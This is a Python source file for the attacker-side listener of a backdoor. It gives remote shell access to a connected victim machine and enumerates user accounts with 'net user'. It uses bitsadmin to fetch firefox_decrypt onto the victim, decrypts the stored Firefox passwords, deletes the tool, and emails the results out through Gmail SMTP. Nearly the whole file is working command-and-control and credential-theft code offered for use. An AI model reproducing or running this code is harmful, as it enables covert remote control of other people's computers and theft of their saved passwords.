#!/usr/bin/env python4
# -*- coding: utf-8 -*-

# Listener para el backdoor 

import sys
import socket
import signal
import smtplib
from termcolor import colored
from email.mime.text import MIMEText

listener = None # Initialization of the listener in case ctrl+c is executed before its creation


def handler(sig, frame):    # Handler to handle the program's exit

    print(colored(f"\n\n[!] Stopping\n", 'red'))
    sys.exit(1)

signal.signal(signal.SIGINT, handler)   # Capture the output signal (ctrl+c) and call the handler

class Listener:
    def __init__(self, ip, port ):
        self.ip = ip
        self.port = port
        self.options = {'!get-users':'List system valid users (Gmail)',
                        '!get-firefox': 'Get Firefox Stored Passwords', # Help panel for automated functions
                        '!help':'Show help panel'}

        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # Creation the server socket
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

        self.server_socket.bind((self.ip, self.port))
        self.server_socket.listen()
        self.c_sock, self.c_addr = self.server_socket.accept()  # Accept client connections

        connection = self.c_sock.recv(5120).decode().strip()

        print(f"\n{connection} from [{self.c_addr}]\n")

    def execute_remotely(self, command):    # Function that sends the commands to be executed on the victim machine

        self.c_sock.sendall(command.encode())
        command_output = self.c_sock.recv(5120).decode()
        return command_output

    def send_email(self, subject, body, sender, recipients, password):  # Function that sends email

        msg = MIMEText(body)
        msg['Subject'] = subject
        msg['From'] = sender
        msg['To'] = ', '.join(recipients)

        with smtplib.SMTP_SSL('smtp.gmail.com', 465) as smtp_server:
            smtp_server.login(sender, password)
            smtp_server.sendmail(sender, recipients, msg.as_string())

        print("\n[+] Email sent!\n")

    def get_users(self):    # Function that lists the users of the victim machine

        command_output = self.execute_remotely('net user')

        self.send_email("Users List Info", command_output, '<Your email Address>',
                        ["<Destination addresses>"], "<Email app password>")

    def help_panel(self):   # Function that prints the help panel
        print(colored(f"\n[i] Functions Options:", 'yellow'))
        for key, value in self.options.items():
            print(colored(f"\t{key} -- {value}\n",'magenta'))

    def get_firefox_profile(self, username):    # Function that obtains the Firefox profile where to extract the passwords

        path= f"C:\\Users\\{username}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles"
        command = f"dir {path}"
        try:
            dir_command_output = self.execute_remotely(command)
            profile_line = next(line for line in dir_command_output.split('\n') if "release" in line)
            profile_name = profile_line.split()[-1]
            return profile_name
        except Exception as e:
            return None

    def get_firefox_passwords(self, username, profile): # Function that downloads firefox_decrypt and extracts saved passwords

        download_url = "https://raw.githubusercontent.com/unode/firefox_decrypt/refs/heads/main/firefox_decrypt.py"
        path_download = "%TEMP%\\firefox_decrypt.py"
        options_download = "/transfer mydownload /download /priority normal"
        command_download = f"bitsadmin {options_download} {download_url} {path_download}"

        profile_path = f"C:\\Users\\{username}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles\\{profile}"
        try:
            self.execute_remotely(command_download)
            command= f"python {path_download} {profile_path}"
            passwords = self.execute_remotely(command)
            self.execute_remotely(f'del {path_download}')
            return passwords

        except:
            return None


    def run(self):  # Function that starts the execution of the listener
        while True:
            command = input(colored(">> ", 'green'))
            match command:
                case '!get-users':
                    self.get_users()

                case '!get-firefox':
                    username = self.execute_remotely("whoami").split('\\')[-1].strip()
                    profile = self.get_firefox_profile(username)

                    if not username or not profile:
                        print(colored(f"\n[!] Error: Can't Obtain Firefox Credentials\n", 'red'))
                    else:
                        passwords= self.get_firefox_passwords(username, profile)

                        if passwords:
                            pass
                            self.send_email("Decripted Firefox Passwords", passwords, '<Your email Address>',
                                       ["<Destination addresses>"], "<Email app password>")
                        else:
                            print(f"\n[!] No Passwords Found ")

                case '!help':
                    self.help_panel()
                case _:
                    command_output = self.execute_remotely(command)
                    if command_output == f'[!] Disconnecting...\n':
                        sys.exit(colored(f"\n{command_output}", 'red'))

                    print(colored(f"{command_output}", 'blue'))

if __name__ == '__main__':
    try:
        listener = Listener('0.0.0.0', 443)
        listener.run()
    finally:
        if listener:
            listener.server_socket.close()
